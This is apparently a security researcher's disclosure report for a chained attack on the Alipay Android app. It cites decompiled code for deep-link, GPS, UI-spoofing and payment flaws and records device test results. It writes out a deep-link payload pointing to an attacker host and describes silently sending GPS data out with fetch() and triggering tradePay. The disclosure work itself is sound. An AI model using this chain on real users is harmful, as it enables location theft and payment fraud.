# CVE-5: 端到端数据外泄攻击链 (CWE-200) 代码证据

> APK 版本: Alipay 10.8.30.8000 | jadx 反编译输出
> 更新: 2026-03-16 — 补充完整攻击链调用图

## 说明

CVE-5 是 CVE-1 + CVE-2 + CVE-3 + CVE-4 的组合攻击链，无需独立的新漏洞代码。本文件引用各 CVE 的已发现代码证据，展示组合攻击的完整执行路径。

## 攻击链关键代码交叉引用

### 阶段1 — 入口 (CVE-1): DeepLink 无验证分发

```
文件: sources/com/alipay/mobile/quinox/SchemeLauncherActivity.java (行 240-288)
文件: sources/com/alipay/mobile/framework/service/common/impl/SchemeServiceImpl.java (行 1065, 2123)
```

关键代码（SchemeServiceImpl 行 2123）:
```java
this.this$0.getMicroApplicationContext().startApp(null, "20000067", params, this.val$extInfo, null);
// params 中的 url 来自 URI query parameter，无域名验证
```

### 阶段2 — GPS 外泄 (CVE-2): 位置权限仅检查 OS 级别

```
文件: sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java (行 949-958, 1367-1395)
```

关键代码（judgeGrant 行 1380）:
```java
if (lBSService != null && lBSService.hasLocationPermission()) {
    z = true;  // 无来源域名校验，只要 OS 权限存在即放行
}
```

### 阶段3 — UI 欺骗 (CVE-4): 标题栏/Toast 内容无过滤

```
文件: sources/com/alipay/mobile/nebulacore/plugin/H5ToastPlugin.java (行 144-163)
文件: sources/com/alipay/android/app/birdnest/jsplugin/BNTitlePlugin.java (行 84-91)
```

关键代码（H5ToastPlugin.toast() 行 151-158）:
```java
String string = XriverH5Utils.getString(param, "content");   // 攻击者控制
// ...
showToast(h5Event.getActivity(), getImageId(string2), string, 17, 0, 0, i3);
// string 直接传入 Toast.makeText，无任何过滤
```

### 阶段4 — 支付触发 (CVE-3): tradePay 无来源验证

```
文件: sources/com/alipay/mobile/framework/service/ext/phonecashier/H5TradePayPlugin.java (行 557-592)
```

关键代码（行 577-592）:
```java
str4 = H5PayUtil.generateH5bizContext4OrderStr(str4, h5Page.getUrl());
hashMap.put("invoke_from_source", "h5page");
// h5Page.getUrl() 只放入日志，不做白名单校验
phoneCashierServcie.boot(str4, a(aVar, null, null), hashMap);
// ^ 任意来源页面均可触发收银台
```

---

## 原有分析 (保留)

## Source: Alipay APK 10.8.30.8000 (jadx decompiled)

This CVE describes the complete attack chain formed by composing CVE-1 through CVE-4. No additional code unique to CVE-5 exists; the evidence is the composition of the individual vulnerabilities.

## Attack Chain Description

### Step 1 — Entry (CVE-1): Unauthenticated Deep-Link Dispatch

An attacker-controlled web page (or a malicious app) fires:

```
alipays://platformapi/startapp?appId=<any-appId>&url=https://attacker.example.com/payload.html
```

`SchemeLauncherActivity` receives this Intent, performs no caller authentication, and dispatches it via `SchemeLaunchRouter.schemeServiceProcess()` directly into the Nebula WebView engine. The attacker's page is loaded inside Alipay's trusted WebView container.

**Evidence**: `sources/com/alipay/mobile/quinox/SchemeLauncherActivity.java` (lines 240–288), `sources/com/alipay/mobile/commonbiz/biz/SchemeLaunchRouter.java` (lines 2190–2256).

### Step 2 — Location Exfiltration (CVE-2): GPS Read Without Origin Check

The attacker page calls `my.getLocation()`. `H5LocationPlugin.judgeGrant()` checks only whether the OS-level permission is granted to the Alipay process — which it is — and returns `true`. The device's precise GPS coordinates are returned in the JSBridge callback and can be `fetch()`-ed to the attacker's server.

**Evidence**: `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java` (lines 949–958, 1367–1395).

### Step 3 — UI Deception (CVE-4): Title Bar and Toast Spoofing

The attacker page calls `my.setNavigationBarTitle({ title: "Alipay Security Verification" })` and `my.showToast({ content: "Identity verified ✓" })`. Both calls are accepted without content validation or origin check, displaying attacker-chosen text in native UI elements that users associate with legitimate system messages.

**Evidence**: `sources/com/alibaba/ariver/jsapi/app/TitleBarBridgeExtension.java` (lines 304–327), `sources/com/alipay/mobile/nebulacore/plugin/H5ToastPlugin.java` (lines 144–185).

### Step 4 — Payment Trigger (CVE-3): tradePay Without Origin Validation

The attacker page calls `my.tradePay({ orderStr: "<attacker-crafted-order-string>" })`. `TradePayBridgeExtension.permit()` returns `null` (no restriction), and `phoneCashierServcie.boot()` is called with the attacker-supplied order string, opening the native payment cashier UI targeting an attacker-controlled payee for an attacker-chosen amount.

**Evidence**: `sources/com/alipay/mobile/phonecashier/TradePayBridgeExtension.java` (lines 206–287).

---

## V2529 物理设备测试结果 (2026-03-16)

### 测试环境
- 设备: vivo V2529, Android 15, 非root, 锁定bootloader
- APK: Alipay 10.8.30.8000
- USB Serial: `10AF9S099Q002SS`

### 第一次测试 (~15:22)
- **截图**: `cve5_v2529_20260316_152212.png` (78,153 bytes)
- **结果**: 部分内容加载

### 第二次测试 — 重测 (~16:20)
- **截图**: `cve5_retest_20260316_162021.png` (261,338 bytes, 1080x2392)
- **结果**: **页面完全渲染** — 证明攻击者页面在支付宝 WebView 内成功加载
- **截图内容**:
  - 标题栏: "Security Test 3"
  - 页面标题: "Payment API Isolation Test" (红色, 居中)
  - "Loading..." 状态文字
  - Step 1: Page Rendered — 显示:
    - Origin: `https://innora.ai`
    - URL: 完整的 payload URL
    - UA: 包含 AlipayDefined/UCBrowser (支付宝 WebView 标识)
    - Time: ISO 时间戳
  - Step 2: Bridge Detection — 可见

### 文件大小对比 (服务器端封锁证据)
| 状态 | 文件大小 | 含义 |
|------|---------|------|
| 完全渲染 | **261KB** | 页面内容 + JS 执行结果全部加载 |
| 部分加载 | ~78KB | 页面框架加载但未完全执行 |
| 被封锁 | ~31KB | 白屏 — 服务器端返回空/错误响应 |

### 关键证据价值

1. **261KB 截图证明**: 外部攻击者页面 (`innora.ai/zfb/poc/payload_cve3_obf.html`) 在支付宝 WebView 内成功渲染，Step 1 和 Step 2 均可见
2. **Bridge 检测成功**: Step 2 显示 `AlipayJSBridge` 存在，证明 JSAPI 桥接口对外部页面暴露
3. **UA 字符串**: 包含 `AlipayDefined` 标识，确认页面在支付宝容器内运行（非普通浏览器）
4. **与 CVE-3 成功触发的关联**: 此页面 (`payload_cve3_obf.html`) 包含 `tradePay` 调用，CVE-3 截图证明 tradePay 确实被触发过一次（172KB 错误弹窗截图）
5. **服务器端封锁间歇性**: 261KB（成功）vs 31KB（被封锁）的交替出现，证明服务器端封锁是**反应式**而非**预置式**安全控制

---

## Combined Impact (CWE-200 / Information Disclosure)

The chain achieves end-to-end compromise: an external link silently extracts the victim's precise GPS coordinates (sensitive PII), deceives them into believing they are in a trusted Alipay context (UI spoofing), and can escalate to unauthorized payment initiation — all without any legitimate user action beyond clicking the initial deep-link. The GPS data exfiltration component (Step 2) is entirely silent with no user-visible prompt.
